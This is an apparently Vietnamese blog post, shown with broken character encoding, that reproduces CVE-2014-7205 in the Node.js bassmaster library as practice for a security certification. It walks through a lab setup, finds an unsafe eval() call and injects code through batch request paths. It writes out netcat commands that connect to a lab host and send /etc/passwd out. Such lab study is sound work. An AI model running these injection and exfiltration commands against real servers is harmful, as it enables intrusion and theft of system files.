---
title: Bassmaster_nodejs_CVE-2014-7205
date: 2019-09-06T06:13:10.000+00:00
tags: cve, oswe, bassmaster

---
ƒê√¢y l√† m·ªôt cve m√¨nh th·ª±c hi·ªán reproduce ƒë·ªÉ t·∫≠p luy·ªán cho OSWE ch·ª© Bassmaster c≈©ng ƒë√£ kh√¥ng c√≤n ƒë∆∞·ª£c h·ªó tr·ª£ :
[https://www.npmjs.com/package/bassmaster](https://www.npmjs.com/package/bassmaster)
v√† cve n√†y c≈©ng ƒë√£ c√≥ t·ª´ 2014.

[https://www.cvedetails.com/cve/CVE-2014-7205/](https://www.cvedetails.com/cve/CVE-2014-7205/)

Bassmaster l√† m·ªôt th∆∞ vi·ªán nodejs h·ªó tr·ª£ vi·ªác th·ª±c hi·ªán nhi·ªÅu requests t·ªõi web server (c·ª• th·ªÉ l√† hapi) b·∫±ng 1 request duy nh·∫•t (POST t·ªõi /batch endpoint c·ªßa th∆∞ vi·ªán t·∫°o ra). Ex:

    POST /batch
    { "requests": [
        {"method": "get", "path": "/users/1"},
        {"method": "get", "path": "/users/2"}
    ] }

## 1. Th·ª±c hi·ªán setup m√¥i tr∆∞·ªùng exploit

Do patch bassmaster b·ªã exploit <= 1.51 n√™n b·∫°n l∆∞u √Ω l√† c·∫ßn t·∫£i ƒë√∫ng
version. Tr√™n release ·ªü github c·ªßa bassmaster th√¨ c√≥ patch 1.21 l√† g·∫ßn
nh·∫•t 1.51 n√™n m√¨nh s·∫Ω l·ª±a ch·ªçn n√≥

[https://github.com/outmoded/bassmaster/releases?after=v1.9.0](https://github.com/outmoded/bassmaster/releases?after=v1.9.0)

ƒê·ªÉ cho nhanh g·ªçn ta d√πng lu√¥n code server m·∫´u **batch.js** trong th∆∞ m·ª•c
**examples/** c·ªßa source code. ƒê·ªÉ tr√°nh xung ƒë·ªôt package th√¨ n√™n copy
th∆∞ m·ª•c n√†y ra ri√™ng v√† th·ª±c hi·ªán c√†i ƒë·∫∑t 2 package c·∫ßn thi·∫øt th√¥i:

    npm install bassmaster@1.5.1
    npm install hapi@10.0.0

Sau khi c√†i ƒë·∫∑t xong s·∫Ω c√≥ ƒë∆∞·ª£c file **package.json** h∆°i s∆∞∆°ng s∆∞∆°ng
gi·ªëng n√†y :v:

![](/image/bassmaster/package.png)

Ti·∫øp theo c·∫ßn ph·∫£i edit l·∫°i **batch.js** ph·∫ßn **http.register** s·∫Ω
require **_batchmasster_** (ph·∫ßn n√†y s·∫Ω b·∫£o hapi load plugin bassmaster
cho ch√∫ng ta)

![](/image/bassmaster/edit_batch.png)

Gi·ªù ƒë·ªÉ ch·∫°y server:

    node batch.js

Test l·∫°i:

![image](/image/bassmaster/firefox_test.png)

Ok ! Nh∆∞ th·∫ø ta ƒë√£ c√≥ m√¥i tr∆∞·ªùng ƒë·ªÉ ch·ªçc ph√° r·ªìi üòÅ

## 2. Ti·∫øn h√†nh ph√¢n t√≠ch code v√† exploit

Ta s·∫Ω ph√¢n t√≠ch source code v√† debug ƒë·ªÉ th·ª±c hi·ªán exploit. ƒê·ªÉ l√†m nh∆∞
th·∫ø ta s·∫Ω ph√¢n t√≠ch source trong **node_modules/bassmaster/** c·ªßa th∆∞c
m·ª•c example ta ch·∫°y demo.

Tr∆∞·ªõc h·∫øt ch·∫°y POST request /batch ƒë·ªÉ xem behavior c·ªßa web server tr·∫£ v·ªÅ
(payload m·∫´u trong source code :v )

![image](/image/bassmaster/post_batch_1.png)

Ta c√≥ th·ªÉ th·∫•y payload c√≥ 3 request v√† response tr·∫£ v·ªÅ s·∫Ω c√≥ 3 k·∫øt qu·∫£
t∆∞∆°ng ·ª©ng. V·∫≠y ta ƒë√£ hi·ªÉu c∆° b·∫£n c·ªßa plugin n√†y.

Nh√¨n v√†o source c·ªßa **bassmaster** ta c√≥ th·ªÉ th·∫•y ch·ªâ c√≥ file
**lib/batch.js** l√† c·∫ßn quan t√¢m (may qu√° code c·ªßa library n√†y √≠t
‚ï∞(_¬∞‚ñΩ¬∞_)‚ïØ).

Review qua ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c function cho **internals.batch** (feature
ch√≠nh handle **/batch** ) m√† ta quan t√¢m.

![](/image/bassmaster/batch_1.png)

Nh√¨n xu·ªëng source code ta th·∫•y h√†m **_eval()_** . Wow!, th·ª±c s·ª± qu√° vui
khi th·∫•y h√†m n√†y do h√†m **_eval()_** r·∫•t d·ªÖ v√† ƒë√£ b·ªã khai th√°c nhi·ªÅu
trong nhi·ªÅu ·ª©ng d·ª•ng nodejs: [eval-and-hackers
dream](https://www.c-sharpcorner.com/article/eval-and-hackers-dream-in-javascript/)

![](/image/bassmaster/batch_debug_1.png)

V√¨ l√Ω do tr√™n ta s·∫Ω th·ª≠ khai th√°c eval(), tr∆∞·ªõc h·∫øt do eval() n·∫±m trong
ƒëi·ªÅu ki·ªán **_if..else_** n√™n ta c·∫ßn bi·∫øt c√°ch ƒë·ªÉ k√≠ch ho·∫°t function n√†y.
N·∫øu b·∫°n n√†o code gi·ªèi ch·∫Øc ƒë·ªçc v√†o l√† bi·∫øt li·ªÅn ch·ª© m√¨nh h∆°i g√† n√™n ƒë√†nh
debug th·ªß c√¥ng üò¢.

C√¢u l·ªánh **eval()** th·ª±c hi·ªán c√¢u l·ªánh c√≥ bi·∫øn **_parts\[i\].value_** n√™n
ta s·∫Ω xu·∫•t bi·∫øn n√†y ra ƒë·ªÉ xem n√≥ l√† g√¨. ƒê·ªìng th·ªùi trong ƒëi·ªÅu ki·ªán
**_if..else_** th·∫•y th√™m 1 bi·∫øn **path** c√≥ th·ªÉ c√≥ gi√° tr·ªã c·∫ßn quan t√¢m:

![](/image/bassmaster/batch_debug_2.png)

![](/image/bassmaster/batch_debug_3.png)

Th·ª±c hi·ªán ch·∫°y l·∫°i code ƒë√£ thay ƒë·ªïi v√† xem th√¥ng tin xu·∫•t ra:

![](/image/bassmaster/console_log_1.png)

C√≥ th·ªÉ th·∫•y t·ª´ log tr√™n, trong 3 request c·ªßa payload th√¨ ch·ªâ c√≥ request
cu·ªëi l√† ƒë∆∞·ª£c th·ª±c hi·ªán trong **eval()**

    { "method": "get", "path": "/item/$1.id"}

T·ª´ ƒë·ªãnh d·∫°ng c·ªßa request tr√™n v√† source code ta c√≥ th·ªÉ hi·ªÉu ƒë∆∞·ª£c
**eval()** s·∫Ω th·ª±c hi·ªán c√°c request path c√≥ c√°c k√≠ t·ª± :

    var requestRegex = /(?:\/)(?:\$(\d)+\.)?([^\/\$]*)/g; 

T·ª´ ƒë√≥ ta s·∫Ω th·ª±c hi·ªán inject code v√†o h√†m eval() theo ƒë·ªãnh d·∫°ng request
**$1.id**

Th·ª≠ inject c√¢u l·ªánh nc:

    nc 192.168.197.128 4000 (ƒëang b·∫≠t nc listen ·ªü ip t∆∞∆°ng ·ª©ng)

![](/image/bassmastertest_nc.png)

Ta nh·∫≠n ƒë∆∞·ª£c k·∫øt qu·∫£:

![](/image/bassmaster/kali.png)

Ok nh∆∞ v·∫≠y ta ƒë√£ inject th√†nh c√¥ng. Th·ª≠ c√¢u l·ªánh

    cat /etc/passwd | nc 192.168.197.128 4000

L∆∞u √Ω c√°c regex ƒë·∫∑c bi·ªát c·∫ßn ph·∫£i chuy·ªÉn sang hex code, c√≥ th·ªÉ d√≤ ·ªü ƒë√¢y:

[https://www.utf8-chartable.de/unicode-utf8-table.pl?unicodeinhtml=hex](https://www.utf8-chartable.de/unicode-utf8-table.pl?unicodeinhtml=hex)

![image](/image/bassmaster/exploit.png)

Ta ƒë∆∞·ª£c k·∫øt qu·∫£ ·ªü nc server:

![image](/image/bassmaster/kali_2.png)

Nh∆∞ th·∫ø ta ƒë√£ exploit th√†nh c√¥ng bassmaster, n·∫øu b·∫°n mu·ªën nh√∫ng c√°c
shell nodejs kh√°c c√≥ th·ªÉ tham kh·∫£o th√™m:

[https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/](https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/)

B√†i vi·∫øt k·∫øt th√∫c ·ªü ƒë√¢y r·ªìi ‚Äòüòú.B·∫°n c√≥ l·∫•y file th·ª±c hi·ªán t·∫°i link n√†y:

[bassmaster_cve](/archive/bassmaster_cve.zip)

Thanks for reading !